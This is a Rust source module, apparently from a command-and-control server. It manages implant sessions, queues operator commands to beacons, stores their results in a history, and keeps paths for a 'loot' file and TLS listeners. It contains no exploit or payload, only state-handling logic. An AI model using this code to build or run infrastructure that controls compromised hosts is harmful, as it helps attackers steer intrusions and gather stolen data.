/// Global C2 server state — sessions, commands, events, dynamic listeners.
use crate::models::*;
use std::collections::{HashMap, VecDeque};
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::{broadcast, RwLock};

const MAX_COMMANDS_PER_BEACON: usize = 10;
const MAX_COMMAND_HISTORY: usize = 500;

/// Handle to a running beacon listener so we can stop it later.
pub struct ListenerHandle {
    pub port: u16,
    pub protocol: String,
    pub abort: tokio::sync::oneshot::Sender<()>,
}

pub struct AppState {
    /// All implant sessions keyed by implant_id.
    pub sessions: RwLock<HashMap<String, ImplantSession>>,

    /// Per-implant command queues.
    pub command_queues: RwLock<HashMap<String, VecDeque<PendingCommand>>>,

    /// Per-implant command history.
    pub command_history: RwLock<HashMap<String, Vec<CommandRecord>>>,

    /// Broadcast channel for WebSocket event subscribers.
    pub event_tx: broadcast::Sender<C2Event>,

    /// Active beacon listeners (port → handle).
    pub listeners: RwLock<HashMap<u16, ListenerHandle>>,

    /// TLS certificate paths.
    pub cert_path: PathBuf,
    pub key_path: PathBuf,

    /// Legacy log file paths.
    pub beacon_log: PathBuf,
    pub loot_file: PathBuf,
    pub all_log: PathBuf,
}

impl AppState {
    pub fn new(
        beacon_log: PathBuf,
        loot_file: PathBuf,
        all_log: PathBuf,
        cert_path: PathBuf,
        key_path: PathBuf,
    ) -> Self {
        let (event_tx, _) = broadcast::channel(256);
        AppState {
            sessions: RwLock::new(HashMap::new()),
            command_queues: RwLock::new(HashMap::new()),
            command_history: RwLock::new(HashMap::new()),
            event_tx,
            listeners: RwLock::new(HashMap::new()),
            cert_path,
            key_path,
            beacon_log,
            loot_file,
            all_log,
        }
    }

    // ── Session management ──────────────────────────────────────────

    pub async fn ensure_session(
        &self, implant_id: &str, hostname: &str, ip: &str,
        tier: &str, os: &str, arch: &str, uid: u32, protocol_version: u32,
    ) -> bool {
        let mut sessions = self.sessions.write().await;
        if sessions.contains_key(implant_id) {
            let s = sessions.get_mut(implant_id).unwrap();
            s.update_seen(ip.to_string());
            s.update_metadata(Some(os.to_string()), Some(arch.to_string()), Some(uid), Some(tier.to_string()));
            false
        } else {
            let session = ImplantSession::new(
                implant_id.to_string(), hostname.to_string(), ip.to_string(),
                tier.to_string(), os.to_string(), arch.to_string(), uid, protocol_version,
            );
            sessions.insert(implant_id.to_string(), session);
            true
        }
    }

    pub async fn get_session(&self, implant_id: &str) -> Option<ImplantSession> {
        self.sessions.read().await.get(implant_id).cloned()
    }

    pub async fn list_sessions(&self) -> Vec<ImplantSession> {
        self.sessions.read().await.values().cloned().collect()
    }

    pub async fn remove_session(&self, implant_id: &str) -> bool {
        self.sessions.write().await.remove(implant_id).is_some()
    }

    // ── Command queue management ────────────────────────────────────

    pub async fn queue_command(&self, implant_id: &str, cmd: PendingCommand) -> Result<QueueCommandResponse, String> {
        {
            let sessions = self.sessions.read().await;
            if !sessions.contains_key(implant_id) {
                return Err(format!("session {} not found", implant_id));
            }
        }
        let response = QueueCommandResponse {
            command_id: cmd.id.clone(),
            module: cmd.module.clone(),
            action: cmd.action.clone(),
            status: "pending".to_string(),
        };
        let mut queues = self.command_queues.write().await;
        let queue = queues.entry(implant_id.to_string()).or_insert_with(VecDeque::new);
        queue.push_back(cmd);
        {
            let mut sessions = self.sessions.write().await;
            if let Some(s) = sessions.get_mut(implant_id) {
                s.pending_commands = queue.len();
            }
        }
        let _ = self.event_tx.send(C2Event::CommandQueued {
            implant_id: implant_id.to_string(),
            command_id: response.command_id.clone(),
            module: response.module.clone(),
        });
        Ok(response)
    }

    pub async fn dequeue_commands(&self, implant_id: &str) -> Vec<PendingCommand> {
        let mut queues = self.command_queues.write().await;
        let queue = match queues.get_mut(implant_id) {
            Some(q) => q,
            None => return Vec::new(),
        };
        let count = queue.len().min(MAX_COMMANDS_PER_BEACON);
        let mut commands: Vec<PendingCommand> = Vec::with_capacity(count);
        for _ in 0..count {
            if let Some(mut cmd) = queue.pop_front() {
                cmd.mark_sent();
                let _ = self.event_tx.send(C2Event::CommandSent {
                    implant_id: implant_id.to_string(),
                    command_id: cmd.id.clone(),
                });
                commands.push(cmd);
            }
        }
        // Write history BEFORE releasing lock to prevent race with result handler
        {
            let mut history = self.command_history.write().await;
            let entries = history.entry(implant_id.to_string()).or_insert_with(Vec::new);
            for cmd in &commands {
                entries.push(CommandRecord::from(cmd.clone()));
            }
        }
        {
            let mut sessions = self.sessions.write().await;
            if let Some(s) = sessions.get_mut(implant_id) {
                s.pending_commands = queue.len();
                s.total_commands += commands.len() as u64;
            }
        }
        commands
    }

    pub async fn cancel_command(&self, implant_id: &str, command_id: &str) -> bool {
        let mut queues = self.command_queues.write().await;
        if let Some(queue) = queues.get_mut(implant_id) {
            if let Some(pos) = queue.iter().position(|c| c.id == command_id) {
                queue.remove(pos);
                return true;
            }
        }
        false
    }

    // ── Result management ───────────────────────────────────────────

    pub async fn store_result(&self, implant_id: &str, result: CommandResultData) {
        let mut history = self.command_history.write().await;
        let entries = history.entry(implant_id.to_string()).or_insert_with(Vec::new);
        let cmd_id = result.command_id.clone().unwrap_or_else(|| "unknown".into());
        let status = result.status.clone().unwrap_or_else(|| "completed".into());
        if let Some(record) = entries.iter_mut().find(|r| r.id == cmd_id) {
            record.completed_at = Some(chrono::Utc::now());
            record.status = if status == "completed" { CommandStatus::Completed } else { CommandStatus::Failed };
            record.result = result.data.clone();
        } else {
            entries.push(CommandRecord {
                id: cmd_id.clone(), module: "unknown".into(), action: "execute".into(),
                args: serde_json::Value::Null, created_at: chrono::Utc::now(),
                delivered_at: None, completed_at: Some(chrono::Utc::now()),
                status: if status == "completed" { CommandStatus::Completed } else { CommandStatus::Failed },
                result: result.data,
            });
        }
        while entries.len() > MAX_COMMAND_HISTORY { entries.remove(0); }
        let _ = self.event_tx.send(C2Event::CommandResult {
            implant_id: implant_id.to_string(), command_id: cmd_id, status,
        });
    }

    pub async fn get_command_history(&self, implant_id: &str) -> Vec<CommandRecord> {
        self.command_history.read().await.get(implant_id).cloned().unwrap_or_default()
    }

    pub async fn get_command(&self, implant_id: &str, command_id: &str) -> Option<CommandRecord> {
        self.command_history.read().await
            .get(implant_id)
            .and_then(|entries| entries.iter().find(|r| r.id == command_id).cloned())
    }

    // ── Event broadcast ─────────────────────────────────────────────

    pub fn broadcast_event(&self, event: C2Event) {
        let _ = self.event_tx.send(event);
    }
}
